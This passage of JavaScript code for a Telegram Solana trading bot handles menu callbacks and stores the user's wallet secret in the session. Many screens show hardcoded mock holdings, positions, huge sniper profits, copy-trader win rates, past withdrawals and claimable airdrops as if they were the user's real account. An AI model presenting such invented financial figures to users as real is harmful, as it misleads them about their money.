      "🔍 <b>Token Search</b>\n\nPlease enter a token symbol, name, or contract address to search:",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
    // Enter search mode
    ctx.session.searchMode = true;
  } else if (ctx.match.input === "VIEW_CHARTS") {
    await ctx.answerCbQuery();
    await ctx.editMessageText(
      "📊 <b>Chart Viewer</b>\n\n<b>How to view charts:</b>\n\n• <b>Paste any token address</b> to view detailed information and live charts\n• <b>Use the search function</b> to find tokens by name or symbol\n• <b>Click on Live Chart links</b> in search results and trending lists\n\n<b>Chart Features:</b>\n• Real-time price data\n• Interactive charts\n• Multiple timeframes\n• Dark theme optimized\n• Mobile-friendly",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("🔍 Search Tokens", "SEARCH_TOKEN")],
          [Markup.button.callback("🔥 Trending", "TRENDING")],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "BACK_MAIN") {
    await ctx.answerCbQuery();
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (secret) {
      try {
        const price = await utils.getSolPrice();
        const sol = await utils.getUserBalance(secret);
        const userWalletAddress = getUserWalletAddress(ctx);
        await ctx.replyWithHTML(
          messages.welcome(Number(sol), Number(price), userWalletAddress),
          buttons.activeTrades,
        );
      } catch (err) {
        await ctx.replyWithHTML(
          messages.welcome(0.0, 0.0),
          buttons.activeTrades,
        );
      }
    } else {
      await ctx.replyWithHTML(messages.welcome(0.0, 0.0), buttons.activeTrades);
    }
    await ctx.reply("Select an action:", buttons.main);
  } else if (ctx.match.input === "REFERRALS") {
    if (!(await requireWallet(ctx, "Referrals"))) return;

    await ctx.editMessageText(
      "🎯 <b>Referral Program</b>\n\n<b>Earn rewards by referring friends!</b>\n\n• <b>5%</b> of their trading fees\n• <b>10 SOL</b> bonus for 10 referrals\n• <b>Exclusive</b> VIP access\n\n<b>Your Referral Stats:</b>\n• Total Referrals: <b>0</b>\n• Total Earnings: <b>0 SOL</b>\n• Referral Code: <code>JUDE123</code>",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("📤 Share Referral", "SHARE_REFERRAL")],
          [Markup.button.callback("📊 Referral History", "REFERRAL_HISTORY")],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "BUY") {
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (!secret) {
      await ctx.editMessageText(utils.walletPrompt("Trading").text, {
        parse_mode: "HTML",
        reply_markup: utils.walletPrompt("Trading").buttons.reply_markup,
      });
    } else {
      try {
        const sol = await utils.getUserBalance(secret);
        await ctx.editMessageText(
          `🛒 <b>Buy Tokens</b>\n\n💰 <b>Your Balance:</b> ${utils.escapeHtml(sol)} SOL\n\n<b>Available Actions:</b>\n• Paste any token address to view details\n• Use search to find tokens\n• View trending tokens\n\n<b>Quick Buy Options:</b>`,
          {
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.button.callback("🔥 Trending", "TRENDING"),
                Markup.button.callback("🔍 Search", "SEARCH_TOKEN"),
              ],
              [
                Markup.button.callback("⭐ Profiles", "NEW_PAIRS"),
                Markup.button.callback("🚀 Boosted", "TOP_GAINERS"),
              ],
              [
                Markup.button.callback("💸 Withdraw", "WITHDRAW"),
                Markup.button.callback("📊 Positions", "POSITIONS"),
              ],
              [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
            ]).reply_markup,
          },
        );
      } catch (error) {
        await ctx.editMessageText(
          "❌ <b>Error loading wallet</b>\n\nPlease reconnect your wallet.",
          {
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.button.callback(
                  "🔗 Create or Import Wallet",
                  "CONNECT_WALLET",
                ),
              ],
              [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
            ]).reply_markup,
          },
        );
      }
    }
  } else if (ctx.match.input === "SELL") {
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (!secret) {
      await ctx.editMessageText(utils.walletPrompt("Selling").text, {
        parse_mode: "HTML",
        reply_markup: utils.walletPrompt("Selling").buttons.reply_markup,
      });
    } else {
      // Simulate token holdings
      const mockTokens = [
        {
          symbol: "BONK",
          amount: "1,250,000",
          value: "$125.50",
          change: "+15.2%",
        },
        { symbol: "WIF", amount: "500", value: "$617.00", change: "+8.7%" },
        {
          symbol: "POPCAT",
          amount: "2,000",
          value: "$1,134.00",
          change: "-3.1%",
        },
      ];

      let sellText = "💰 <b>Your Token Holdings</b>\n\n";
      mockTokens.forEach((token, index) => {
        const changeEmoji = token.change.startsWith("+") ? "🟢" : "🔴";
        sellText += `${index + 1}. <b>${utils.escapeHtml(token.symbol)}</b> ${changeEmoji}\n`;
        sellText += `   Amount: ${utils.escapeHtml(token.amount)}\n`;
        sellText += `   Value: ${utils.escapeHtml(token.value)}\n`;
        sellText += `   24h: ${utils.escapeHtml(token.change)}\n\n`;
      });

      sellText += "<b>Click on a token to sell it.</b>";

      await ctx.editMessageText(sellText, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback("🪙 Sell BONK", "SELL_BONK"),
            Markup.button.callback("🐕 Sell WIF", "SELL_WIF"),
          ],
          [
            Markup.button.callback("🐱 Sell POPCAT", "SELL_POPCAT"),
            Markup.button.callback("📊 All Positions", "POSITIONS"),
          ],
          [
            Markup.button.callback("🛒 Buy More", "BUY"),
            Markup.button.callback("⬅️ Back", "BACK_MAIN"),
          ],
        ]).reply_markup,
      });
    }
  } else if (ctx.match.input === "POSITIONS") {
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (!secret) {
      await ctx.editMessageText(utils.walletPrompt("Positions").text, {
        parse_mode: "HTML",
        reply_markup: utils.walletPrompt("Positions").buttons.reply_markup,
      });
    } else {
      // Simulate trading positions
      const mockPositions = [
        {
          symbol: "BONK",
          type: "LONG",
          entry: "$0.000098",
          current: "$0.000113",
          pnl: "+15.3%",
          amount: "1,250,000",
          value: "$141.25",
        },
        {
          symbol: "WIF",
          type: "LONG",
          entry: "$1.15",
          current: "$1.23",
          pnl: "+7.0%",
          amount: "500",
          value: "$615.00",
        },
        {
          symbol: "POPCAT",
          type: "SHORT",
          entry: "$0.58",
          current: "$0.56",
          pnl: "+3.4%",
          amount: "2,000",
          value: "$1,120.00",
        },
      ];

      let positionsText = "📊 *Your Trading Positions*\n\n";
      let totalPnl = 0;

      mockPositions.forEach((pos, index) => {
        const pnlEmoji = pos.pnl.startsWith("+") ? "🟢" : "🔴";
        const typeEmoji = pos.type === "LONG" ? "📈" : "📉";

        positionsText += `${index + 1}. <b>${utils.escapeHtml(pos.symbol)}</b> ${typeEmoji} ${pnlEmoji}\n`;
        positionsText += `   Entry: $${utils.escapeHtml(pos.entry)}\n`;
        positionsText += `   Current: $${utils.escapeHtml(pos.current)}\n`;
        positionsText += `   PnL: ${utils.escapeHtml(pos.pnl)}\n`;
        positionsText += `   Amount: ${utils.escapeHtml(pos.amount)}\n`;
        positionsText += `   Value: ${utils.escapeHtml(pos.value)}\n\n`;

        totalPnl += parseFloat(pos.pnl.replace("%", ""));
      });

      positionsText += `<b>Total PnL: ${totalPnl > 0 ? "+" : ""}${totalPnl.toFixed(1)}%</b>`;

      await ctx.editMessageText(positionsText, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback("💰 Close All", "CLOSE_ALL_POSITIONS"),
            Markup.button.callback("📊 PnL History", "PNL_HISTORY"),
          ],
          [
            Markup.button.callback("🛒 New Trade", "BUY"),
            Markup.button.callback("💰 Sell Tokens", "SELL"),
          ],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      });
    }
  } else if (ctx.match.input === "LIMIT_ORDERS") {
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (!secret) {
      await ctx.editMessageText(utils.walletPrompt("Limit Orders").text, {
        parse_mode: "HTML",
        reply_markup: utils.walletPrompt("Limit Orders").buttons.reply_markup,
      });
    } else {
      // Simulate limit orders
      const mockOrders = [
        {
          symbol: "BONK",
          type: "BUY",
          price: "$0.000095",
          amount: "1,000,000",
          status: "ACTIVE",
          time: "2h ago",
        },
        {
          symbol: "WIF",
          type: "SELL",
          price: "$1.30",
          amount: "300",
          status: "ACTIVE",
          time: "5h ago",
        },
        {
          symbol: "POPCAT",
          type: "BUY",
          price: "$0.52",
          amount: "5,000",
          status: "FILLED",
          time: "1d ago",
        },
      ];

      let ordersText = "📈 *Your Limit Orders*\n\n";

      mockOrders.forEach((order, index) => {
        const typeEmoji = order.type === "BUY" ? "🟢" : "🔴";
        const statusEmoji = order.status === "ACTIVE" ? "⏳" : "✅";

        ordersText += `${index + 1}. <b>${utils.escapeHtml(order.symbol)}</b> ${typeEmoji} ${statusEmoji}\n`;
        ordersText += `   Type: ${utils.escapeHtml(order.type)}\n`;
        ordersText += `   Price: $${utils.escapeHtml(order.price)}\n`;
        ordersText += `   Amount: ${utils.escapeHtml(order.amount)}\n`;
        ordersText += `   Status: ${utils.escapeHtml(order.status)}\n`;
        ordersText += `   Time: ${utils.escapeHtml(order.time)}\n\n`;
      });

      ordersText += "<b>Manage your limit orders.</b>";

      await ctx.editMessageText(ordersText, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback("➕ New Order", "NEW_LIMIT_ORDER"),
            Markup.button.callback("❌ Cancel All", "CANCEL_ALL_ORDERS"),
          ],
          [
            Markup.button.callback("📊 Order History", "ORDER_HISTORY"),
            Markup.button.callback("⚙️ Settings", "ORDER_SETTINGS"),
          ],
          [
            Markup.button.callback("🛒 Quick Trade", "BUY"),
            Markup.button.callback("⬅️ Back", "BACK_MAIN"),
          ],
        ]).reply_markup,
      });
    }
  } else if (ctx.match.input === "DCA_ORDERS") {
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (!secret) {
      await ctx.editMessageText(utils.walletPrompt("DCA Orders").text, {
        parse_mode: "HTML",
        reply_markup: utils.walletPrompt("DCA Orders").buttons.reply_markup,
      });
    } else {
      // Simulate DCA orders
      const mockDCA = [
        {
          symbol: "BONK",
          amount: "0.1 SOL",
          frequency: "Daily",
          nextBuy: "2h 15m",
          totalBought: "2.5 SOL",
          avgPrice: "$0.000102",
          status: "ACTIVE",
        },
        {
          symbol: "WIF",
          amount: "0.2 SOL",
          frequency: "Weekly",
          nextBuy: "3d 12h",
          totalBought: "1.8 SOL",
          avgPrice: "$1.18",
          status: "ACTIVE",
        },
        {
          symbol: "SOL",
          amount: "0.5 SOL",
          frequency: "Monthly",
          nextBuy: "15d 6h",
          totalBought: "3.0 SOL",
          avgPrice: "$98.45",
          status: "PAUSED",
        },
      ];

      let dcaText = "🔄 *Your DCA Orders*\n\n";

      mockDCA.forEach((dca, index) => {
        const statusEmoji = dca.status === "ACTIVE" ? "🟢" : "⏸️";

        dcaText += `${index + 1}. <b>${utils.escapeHtml(dca.symbol)}</b> ${statusEmoji}\n`;
        dcaText += `   Amount: ${utils.escapeHtml(dca.amount)}\n`;
        dcaText += `   Frequency: ${utils.escapeHtml(dca.frequency)}\n`;
        dcaText += `   Next Buy: ${utils.escapeHtml(dca.nextBuy)}\n`;
        dcaText += `   Total Bought: ${utils.escapeHtml(dca.totalBought)}\n`;
        dcaText += `   Avg Price: $${utils.escapeHtml(dca.avgPrice)}\n\n`;
      });

      dcaText += "<b>Manage your DCA strategies.</b>";

      await ctx.editMessageText(dcaText, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback("➕ New DCA", "NEW_DCA_ORDER"),
            Markup.button.callback("⏸️ Pause All", "PAUSE_ALL_DCA"),
          ],
          [
            Markup.button.callback("📊 DCA History", "DCA_HISTORY"),
            Markup.button.callback("⚙️ Settings", "DCA_SETTINGS"),
          ],
          [
            Markup.button.callback("🛒 Quick Buy", "BUY"),
            Markup.button.callback("⬅️ Back", "BACK_MAIN"),
          ],
        ]).reply_markup,
      });
    }
  } else if (ctx.match.input === "COPY_TRADE") {
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (!secret) {
      await ctx.editMessageText(utils.walletPrompt("Copy Trading").text, {
        parse_mode: "HTML",
        reply_markup: utils.walletPrompt("Copy Trading").buttons.reply_markup,
      });
    } else {
      // Simulate copy trading
      const mockTraders = [
        {
          name: "CryptoWhale",
          winRate: "87%",
          followers: "2,450",
          monthlyPnl: "+156%",
          trades: "24",
          status: "ACTIVE",
          minAmount: "0.5 SOL",
        },
        {
          name: "SolanaMaster",
          winRate: "92%",
          followers: "1,890",
          monthlyPnl: "+203%",
          trades: "18",
          status: "ACTIVE",
          minAmount: "1.0 SOL",
        },
        {
          name: "DeFiPro",
          winRate: "78%",
          followers: "3,120",
          monthlyPnl: "+89%",
          trades: "31",
          status: "PAUSED",
          minAmount: "0.3 SOL",
        },
      ];

      let copyText = "🤖 *Top Copy Traders*\n\n";

      mockTraders.forEach((trader, index) => {
        const statusEmoji = trader.status === "ACTIVE" ? "🟢" : "⏸️";

        copyText += `${index + 1}. <b>${utils.escapeHtml(trader.name)}</b> ${statusEmoji}\n`;
        copyText += `   Win Rate: ${utils.escapeHtml(trader.winRate)}\n`;
        copyText += `   Followers: ${utils.escapeHtml(trader.followers)}\n`;
        copyText += `   Monthly PnL: ${utils.escapeHtml(trader.monthlyPnl)}\n`;
        copyText += `   Trades: ${utils.escapeHtml(trader.trades)}\n`;
        copyText += `   Min Amount: ${utils.escapeHtml(trader.minAmount)}\n\n`;
      });

      copyText += "<b>Choose a trader to copy.</b>";

      await ctx.editMessageText(copyText, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback("🐋 CryptoWhale", "COPY_CRYPTOWHALE"),
            Markup.button.callback("☀️ SolanaMaster", "COPY_SOLANAMASTER"),
          ],
          [
            Markup.button.callback("🔗 Copy DeFiPro", "COPY_DEFIPRO"),
            Markup.button.callback("📊 My Copy Trades", "MY_COPY_TRADES"),
          ],
          [
            Markup.button.callback("📈 Leaders", "COPY_LEADERBOARD"),
            Markup.button.callback("⚙️ Settings", "COPY_SETTINGS"),
          ],
          [
            Markup.button.callback("🛒 Manual Trade", "BUY"),
            Markup.button.callback("⬅️ Back", "BACK_MAIN"),
          ],
        ]).reply_markup,
      });
    }
  } else if (ctx.match.input === "LP_SNIPER") {
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (!secret) {
      await ctx.editMessageText(utils.walletPrompt("LP Sniper").text, {
        parse_mode: "HTML",
        reply_markup: utils.walletPrompt("LP Sniper").buttons.reply_markup,
      });
    } else {
      // Simulate LP Sniper
      const mockSnipes = [
        {
          token: "MOONSHOT",
          time: "2m ago",
          profit: "+1,250%",
          gasUsed: "0.002 SOL",
          status: "SUCCESS",
        },
        {
          token: "ROCKET",
          time: "15m ago",
          profit: "+890%",
          gasUsed: "0.0015 SOL",
          status: "SUCCESS",
        },
        {
          token: "STARSHIP",
          time: "1h ago",
          profit: "+2,100%",
          gasUsed: "0.003 SOL",
          status: "SUCCESS",
        },
      ];

      let sniperText = "🚀 *LP Sniper Dashboard*\n\n";
      sniperText += "🎯 *Recent Snipes:*\n\n";

      mockSnipes.forEach((snipe, index) => {
        sniperText += `${index + 1}. <b>${utils.escapeHtml(snipe.token)}</b> ✅\n`;
        sniperText += `   Time: ${utils.escapeHtml(snipe.time)}\n`;
        sniperText += `   Profit: ${utils.escapeHtml(snipe.profit)}\n`;
        sniperText += `   Gas: ${utils.escapeHtml(snipe.gasUsed)}\n\n`;
      });

      sniperText += "⚙️ <b>Sniper Settings:</b>\n";
      sniperText += "• Auto Snipe: <b>Enabled</b>\n";
      sniperText += "• Min Liquidity: <b>5 SOL</b>\n";
      sniperText += "• Max Gas: <b>0.005 SOL</b>\n";
      sniperText += "• Slippage: <b>15%</b>\n\n";

      sniperText += "<b>Configure your sniper settings.</b>";

      await ctx.editMessageText(sniperText, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback("🎯 Start Sniper", "START_SNIPER"),
            Markup.button.callback("⏸️ Pause Sniper", "PAUSE_SNIPER"),
          ],
          [
            Markup.button.callback("⚙️ Settings", "SNIPER_SETTINGS"),
            Markup.button.callback("📊 Snipe History", "SNIPE_HISTORY"),
          ],
          [
            Markup.button.callback("🔍 Monitor Pairs", "MONITOR_PAIRS"),
            Markup.button.callback("📈 Stats", "SNIPER_PERFORMANCE"),
          ],
          [
            Markup.button.callback("🛒 Manual Trade", "BUY"),
            Markup.button.callback("⬅️ Back", "BACK_MAIN"),
          ],
        ]).reply_markup,
      });
    }
  } else if (ctx.match.input === "BRIDGE") {
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (!secret) {
      await ctx.editMessageText(utils.walletPrompt("Bridge").text, {
        parse_mode: "HTML",
        reply_markup: utils.walletPrompt("Bridge").buttons.reply_markup,
      });
    } else {
      try {
        const sol = await utils.getUserBalance(secret);
        let bridgeText = "🌉 *Bridge Dashboard*\n\n";
        bridgeText += `💰 <b>Your Balance:</b> ${utils.escapeHtml(sol)} SOL\n\n`;
        bridgeText += "🌐 <b>Available Networks:</b>\n";
        bridgeText += "• Solana ↔ Ethereum\n";
        bridgeText += "• Solana ↔ BSC\n";
        bridgeText += "• Solana ↔ Polygon\n";
        bridgeText += "• Solana ↔ Arbitrum\n\n";
        bridgeText += "📊 <b>Recent Bridges:</b>\n";
        bridgeText += "• 2.5 SOL → ETH (2h ago)\n";
        bridgeText += "• 1.0 ETH → SOL (5h ago)\n";
        bridgeText += "• 0.5 SOL → BSC (1d ago)\n\n";
        bridgeText += "<b>Minimum bridge amount: 0.5 SOL.</b>";

        await ctx.editMessageText(bridgeText, {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.button.callback("🌐 SOL → ETH", "BRIDGE_SOL_TO_ETH"),
              Markup.button.callback("🌐 ETH → SOL", "BRIDGE_ETH_TO_SOL"),
            ],
            [
              Markup.button.callback("🌐 SOL → BSC", "BRIDGE_SOL_TO_BSC"),
              Markup.button.callback("🌐 BSC → SOL", "BRIDGE_BSC_TO_SOL"),
            ],
            [
              Markup.button.callback("📊 Bridge History", "BRIDGE_HISTORY"),
              Markup.button.callback("⚙️ Settings", "BRIDGE_SETTINGS"),
            ],
            [
              Markup.button.callback("🛒 Buy SOL", "BUY"),
              Markup.button.callback("⬅️ Back", "BACK_MAIN"),
            ],
          ]).reply_markup,
        });
      } catch (error) {
        await ctx.editMessageText(
          "❌ <b>Error loading wallet</b>\n\nPlease reconnect your wallet.",
          {
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.button.callback(
                  "🔗 Create or Import Wallet",
                  "CONNECT_WALLET",
                ),
              ],
              [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
            ]).reply_markup,
          },
        );
      }
    }
  } else if (ctx.match.input === "NEW_PAIRS") {
    await ctx.answerCbQuery("Loading token profiles...");
    try {
      const data = await api.getDexScreenerNewPairs();
      const formatted = formatters.formatTokenProfilesList(
        data,
        "Latest Token Profiles",
      );
      await ctx.editMessageText(formatted, {
        parse_mode: "HTML",
        reply_markup: buttons.main.reply_markup,
        disable_web_page_preview: true,
      });
    } catch (error) {
      await ctx.editMessageText("❌ Error loading token profiles.", {
        parse_mode: "HTML",
        reply_markup: buttons.main.reply_markup,
      });
    }
  } else if (ctx.match.input === "WITHDRAW") {
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (!secret) {
      await ctx.editMessageText(utils.walletPrompt("Withdraw").text, {
        parse_mode: "HTML",
        reply_markup: utils.walletPrompt("Withdraw").buttons.reply_markup,
      });
    } else {
      try {
        const sol = await utils.getUserBalance(secret);
        let withdrawText = "💸 *Withdraw Dashboard*\n\n";
        withdrawText += `💰 <b>Available Balance:</b> ${utils.escapeHtml(sol)} SOL\n\n`;
        withdrawText += "📊 <b>Withdrawal Options:</b>\n";
        withdrawText += "• Minimum: 0.5 SOL\n";
        withdrawText += "• Fee: 0.001 SOL\n";
        withdrawText += "• Processing: 1-5 minutes\n\n";
        withdrawText += "📋 <b>Recent Withdrawals:</b>\n";
        withdrawText += "• 2.5 SOL → External (1h ago)\n";
        withdrawText += "• 1.0 SOL → Exchange (3h ago)\n";
        withdrawText += "• 0.8 SOL → Cold Wallet (1d ago)\n\n";
        withdrawText += "<b>Enter amount to withdraw.</b>";

        await ctx.editMessageText(withdrawText, {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.button.callback("💸 Withdraw 0.5 SOL", "WITHDRAW_0.5"),
              Markup.button.callback("💸 Withdraw 1.0 SOL", "WITHDRAW_1.0"),
            ],
            [
              Markup.button.callback("💸 Withdraw 2.5 SOL", "WITHDRAW_2.5"),
              Markup.button.callback("💸 Custom Amount", "WITHDRAW_CUSTOM"),
            ],
            [
              Markup.button.callback(
                "📊 Withdrawal History",
                "WITHDRAWAL_HISTORY",
              ),
              Markup.button.callback("⚙️ Config", "WITHDRAWAL_SETTINGS"),
            ],
            [
              Markup.button.callback("🛒 Buy More", "BUY"),
              Markup.button.callback("⬅️ Back", "BACK_MAIN"),
            ],
          ]).reply_markup,
        });
      } catch (error) {
        await ctx.editMessageText(
          "❌ <b>Error loading wallet</b>\n\nPlease reconnect your wallet.",
          {
            parse_mode: "HTML",
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.button.callback(
                  "🔗 Create or Import Wallet",
                  "CONNECT_WALLET",
                ),
              ],
              [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
            ]).reply_markup,
          },
        );
      }
    }
  } else if (ctx.match.input === "COPY_WALLET") {
    const walletAddress = getUserWalletAddress(ctx);

    await ctx.editMessageText(`<code>${walletAddress}</code>`, {
      parse_mode: "HTML",
      reply_markup: buttons.main.reply_markup,
    });
  } else if (ctx.match.input === "HELP") {
    await ctx.editMessageText(
      "<b>You can open a request to the Meta Trading Bot support service.</b> The Tech team would respond in the next 24 hours Via your your DM \nFor a faster solution to the problem, describe your appeal as clearly as possible. You can provide files or images if needed.\n \n📋 Rules for contacting technical support: \n1️⃣ When you first contact, please introduce yourself. \n2️⃣ Describe the problem in your own words. \n3️⃣ Be polite, and politeness will be with you! \n",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("✍️ Write Complaint", "WRITE_COMPLAINT")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "CLAIM_AIRDROP") {
    if (!(await requireWallet(ctx, "Airdrop Claims"))) return;

    await ctx.editMessageText(
      "🎁 <b>Airdrop Claims</b>\n\n<b>Available Airdrops:</b>\n\n• <b>JUP Airdrop</b> - 50 JUP\n• <b>BONK Airdrop</b> - 1000 BONK\n• <b>WIF Airdrop</b> - 100 WIF\n\n<b>Total Value:</b> <b>$245.67</b>\n\n<b>Click to claim your airdrops!</b>",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("🎁 Claim All", "CLAIM_ALL_AIRDROPS")],
          [Markup.button.callback("📊 Claim History", "AIRDROP_HISTORY")],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "LAUNCH") {
    if (!(await requireWallet(ctx, "Token Launch"))) return;

    await ctx.editMessageText(
      "🚀 <b>Launch New Token</b>\n\n<b>Create and launch your own token on Solana!</b>\n\n<b>Requirements:</b>\n• <b>5 SOL</b> for liquidity\n• <b>Token name</b> and symbol\n• <b>Initial supply</b>\n\n<b>Launch Options:</b>\n• <b>Quick Launch</b> - Standard token\n• <b>Custom Launch</b> - Advanced settings\n• <b>Presale Launch</b> - With presale",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.button.callback("⚡ Quick Launch", "QUICK_LAUNCH")],
          [Markup.button.callback("⚙️ Custom Launch", "CUSTOM_LAUNCH")],
          [Markup.button.callback("🎯 Presale Launch", "PRESALE_LAUNCH")],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "BUYTRENDING") {
    await ctx.editMessageText(
      "🔥 <b>Buy Trending Options</b>\n\n<b>Select your preferred option:</b>",
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback("🌿 SOL Trending", "SOLANA_BUYTRENDING"),
            Markup.button.callback("🧬 ETH Trending", "ETHEREUM_BUYTRENDING"),
          ],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "SOLANA_BUYTRENDING") {
    await ctx.editMessageText(
      `🔥 <b>SOL Trending Tiers</b>\n\n<b>Select a trending tier to view tokens:</b>\n\n💰 <b>Available Tiers:</b>\n• High Volume Trending\n• New Launch Trending\n• Top Gainers Trending\n• Most Active Trending`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback("📈 High Volume", "TRENDING_HIGH_VOLUME"),
            Markup.button.callback("🚀 New Launch", "TRENDING_NEW_LAUNCH"),
          ],
          [
            Markup.button.callback("📊 Top Gainers", "TRENDING_TOP_GAINERS"),
            Markup.button.callback("🔥 Most Active", "TRENDING_MOST_ACTIVE"),
          ],
          [Markup.button.callback("⬅️ Back", "BUYTRENDING")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "ETHEREUM_BUYTRENDING") {
    await ctx.editMessageText(
      `🔥 <b>ETH Trending Tiers</b>\n\n<b>Select a trending tier for tokens:</b>\n\n💰 <b>Available Tiers:</b>\n• High Volume Trending\n• New Launch Trending\n• Top Gainers Trending\n• Most Active Trending`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback(
              "📈 High Volume",
              "TRENDING_HIGH_VOLUME_ETH",
            ),
            Markup.button.callback("🚀 New Launch", "TRENDING_NEW_LAUNCH_ETH"),
          ],
          [
            Markup.button.callback(
              "📊 Top Gainers",
              "TRENDING_TOP_GAINERS_ETH",
            ),
            Markup.button.callback(
              "🔥 Most Active",
              "TRENDING_MOST_ACTIVE_ETH",
            ),
          ],
          [Markup.button.callback("⬅️ Back", "BUYTRENDING")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "ADD_LIQUIDITY") {
    await ctx.editMessageText(
      `💧 <b>Add Liquidity</b>\n\n<b>Select chain for adding liquidity:</b>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback("🌿 SOL Liquidity", "SOL_LIQUIDITY"),
            Markup.button.callback("🧬 ETH Liquidity", "ETH_LIQUIDITY"),
          ],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "VOLUME_SELECTION") {
    await ctx.editMessageText(
      `📊 <b>Volume Booster</b>\n\n<b>Select chain for token volume:</b>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback("🌿 SOL Volume", "SOL_VOLUME"),
            Markup.button.callback("🧬 ETH Volume", "ETH_VOLUME"),
          ],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "SOL_VOLUME") {
    await ctx.editMessageText(
      `📊 <b>SOL Volume Tiers</b>\n\n<b>Select a volume tier to analyze:</b>\n\n💰 <b>Available Tiers:</b>\n• High Volume Analysis\n• Medium Volume Analysis\n• Low Volume Analysis\n• Volume Trends`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback("📈 High Volume", "VOLUME_HIGH_SOL"),
            Markup.button.callback("📊 Medium Volume", "VOLUME_MEDIUM_SOL"),
          ],
          [
            Markup.button.callback("📉 Low Volume", "VOLUME_LOW_SOL"),
            Markup.button.callback("📈 Volume Trends", "VOLUME_TRENDS_SOL"),
          ],
          [Markup.button.callback("⬅️ Back", "VOLUME_SELECTION")],
        ]).reply_markup,
      },
    );
  } else if (ctx.match.input === "ETH_VOLUME") {
    await ctx.editMessageText(
      `📊 <b>ETH Volume Tiers</b>\n\n<b>Select a volume tier to analyze:</b>\n\n💰 <b>Available Tiers:</b>\n• High Volume Analysis\n• Medium Volume Analysis\n• Low Volume Analysis\n• Volume Trends`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [
            Markup.button.callback("📈 High Volume", "VOLUME_HIGH_ETH"),
            Markup.button.callback("📊 Medium Volume", "VOLUME_MEDIUM_ETH"),
          ],
          [
            Markup.button.callback("📉 Low Volume", "VOLUME_LOW_ETH"),
            Markup.button.callback("📈 Volume Trends", "VOLUME_TRENDS_ETH"),
          ],
          [Markup.button.callback("⬅️ Back", "VOLUME_SELECTION")],
        ]).reply_markup,
      },
    );
  } else if (
    ctx.match.input === "SOL_LIQUIDITY" ||
    ctx.match.input === "ETH_LIQUIDITY"
  ) {
    const chain = ctx.match.input === "SOL_LIQUIDITY" ? "SOL" : "ETH";
    await ctx.editMessageText(
      `💧 <b>${chain} Liquidity</b>\n\n<b>Please paste a token address to add liquidity:</b>\n\nExample: <code>So11111111111111111111111111111111111111112</code>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
